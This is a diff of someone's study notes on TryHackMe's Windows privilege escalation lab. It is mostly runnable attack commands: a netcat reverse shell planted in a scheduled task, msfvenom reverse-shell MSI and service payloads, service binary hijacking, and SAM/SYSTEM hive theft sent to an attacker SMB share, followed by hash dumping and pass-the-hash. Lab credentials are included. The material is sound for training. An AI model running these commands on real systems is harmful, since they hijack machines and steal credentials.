@@ -2,6 +2,17 @@ https://tryhackme.com/room/windowsprivesc20
 
 ### Table of contents
 - [[#Intro]]
+- [[#Passwords Harvesting]]
+- [[#Other Quick Wins]]
+	- [[#Scheduled Tasks]]
+	- [[#AlwaysInstallElevated]]
+- [[#Service Misconfigurations]]
+	- [[#Windows Services]]
+	- [[#Service Executable Permissions]]
+	- [[#Unquoted Service Paths]]
+	- [[#Service Permissions]]
+- [[#Abusing Dangerous Privileges]]
+- 
 
 ___
 ### Intro
@@ -63,20 +74,181 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 *Note: Simon Tatham is PuTTY's creator and part of path*
 
 ___
-### 
+### Other Quick Wins
 [[#Table of contents|Back to the top]]
 
+#### Scheduled Tasks
+Scheduled tasks that's lost its binary or using modifiable binary
+**`schtasks`**
 
+```Powershell
+schtasks /query /tn vulntask /fo list /v
+```
+Most important field: `Task To Run` and `Run As User`
+
+**`icacls <Task To Run>`**: check file permission 
+--> `BUILTIN\Users:(I)(F)`: **(F)** means full access for us
+
+If the task to run is modifiable we can edit it into any payload we like
+```cmd
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP ATTACKER_PORT > C:\tasks\schtask.bat
+```
+
+#### AlwaysInstallElevated
+**`.msi`** (Windows installer files) usually configured to run with privilege of user starting it, but can be configured to run with higher privileges
+
+```Powershell
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+Generate malicious .msi with `msfvenom`
+```Bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+
+Run and receive reverse shell
+```Powershell
+C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
 
 ___
-### 
+### Service Misconfigurations
+
+#### Windows Services
 [[#Table of contents|Back to the top]]
 
+Managed by SCM (Service Control Manager)
+Each service has associated executable run by SCM when started
+Service executables have special functions that enables them to communicate with SCM
+Service specifies under which user it runs
 
+**`sc qc <service_name>`:** display detailed info about service
+**--> `BINARY_PATH_NAME`** 
+**--> `SERVICE_START_NAME`:** account used to run service
+
+**DACL** (Discretionary Access Control): who has permission to start, stop, pause, query status, query configuration, reconfigure, ...
+**Process Hacker:** display DACL
+
+**`HKLM\SYSTEM\CurrentControlSet\Services\`:** services configurations
+--> `ImagePath` // BINARY_PATH_NAME
+--> `ObjectName` // SERVICE_START_NAME
+--> `Security` --> DACL
+
+#### Service Executable Permissions
+[[#Table of contents|Back to the top]]
+
+*Example:* WindowsScheduler
+
+1. `icacls <service_binary>` --> `Everyone: (I)(M)`: (M) "modifiable"
+
+2. On attacker machine, generate exe-service payload:
+```Bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev-svc.exe
+```
+
+3. Start web server and download on target machine
+`python3 -m http.server 8080`
+`wget http://ATTACKER_IP:8080/rev-svc.exe -O rev-svc.exe` 
+
+4. Replace executable with payload
+`cd <BINARY_PATH_NAME>`
+`move <executable>.exe <executable>.exe.bkp`
+`move <payload>.exe <executable>.exe`
+`icacls <executable>.exe /grant Everyone:F` 
+
+5. Set up listener and restart service
+`nc -lvp 4444`
+`sc stop windowsscheduler` > `sc start windowsscheduler` 
+
+NB: `sc` is `sc.exe` in Powershell
+
+#### Unquoted Service Paths
+Paths have to be quoted to account for spaces
+
+*Example:* "disk sorter enterprise"
+When trying to execute `disksrs.exe` with the unquoted path `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`, 
+SCM would try to execute `C:\MyPrograms\Disk.exe` with argument 1 `Sorter` and argument 2 `Enterprise\bin\disksrs.exe` because spaces are used as argument separators in terminal, unless quoted
+
+SCM tries to run
+1. `C:\MyPrograms\Disk.exe`
+2. `C:\MyPrograms\Disk Sorter.exe`
+3. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
+--> attacker can create a payload with the name of 1. or 2. 
+
+>*Most services are installed under `C:\Program Files\` or `C:\Program Files (x86)` which are writable by unprivileged users*
+>*Some installers change the permissions on the installed folders*
+
+`icacls c:\MyPrograms` --> `BUILTIN\Users` has **`AD`** and **`WD`** privileges --> create subdirectories and files
+
+Same 2. and 3. as previous section
+`icacls C:\MyPrograms\Disk.exe /grant Everyone:F`
+`sc stop "disk sorter entreprise` > `sc start "disk sorter enterprise`
+
+#### Service Permissions
+[[#Table of contents|Back to the top]]
+
+*Example:* thmservice
+
+If service executable DACL well configured and service binary path rightly quoted, still possible service DACL allow to modify service configuration --> point to executable, run with chosen account
+`accesschk64.exe -qlc <service>`: display service DACL
+--> examine `BUILTIN\Users` permissions (--> `SERVICE_ALL_ACCESS`)
+
+1. Build, transfer payload and grant full permissions (icacls)
+
+2. Change service's associated executable and account
+```Powershell
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+
+3. Setup listener, restart service
 
 ___
-### 
+### Abusing Dangerous Privileges
+
+#### Windows Privileges
+
+**`whoami /priv`:** check your privileges!
+**[Exploitable privileges](https://github.com/gtworek/Priv2Admin)**, [Full list of privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
+
+#### SeBackup / SeRestore
 [[#Table of contents|Back to the top]]
+
+Read/Write any file on system (allow users to perform backups without admin privileges)
+
+**User:** THMBackup
+**Password:** CopyMaster555
+
+1. Connect to VM over RDP
+`xfreerdp /v:TARGET_IP /u:USERNAME`
+
+2. Execute cmd as admin
+
+3. Backup SAM and SYSTEM hashes
+`reg save hklm\system C:\Users\THMBackup\system.hive`
+`reg save hklm\sam C:\Users\THMBackup\sam.hive`
+
+4. Create share on attacker machine
+`mkdir share`
+`python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`
+
+5. Transfer files on share
+`copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\`
+`copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\`
+
+6. Retrieve password hashes
+`python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL`
+
+7. Pass-the-Hash attack
+`python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.82.168.162`
+
+#### SeTakeOwnership
+[[#Table of contents|Back to the top]]
+
+Take ownership of any object 
+
+**User:** THMTakeOwnership
+**Password:** TheWorldIsMine2022
 
 
 
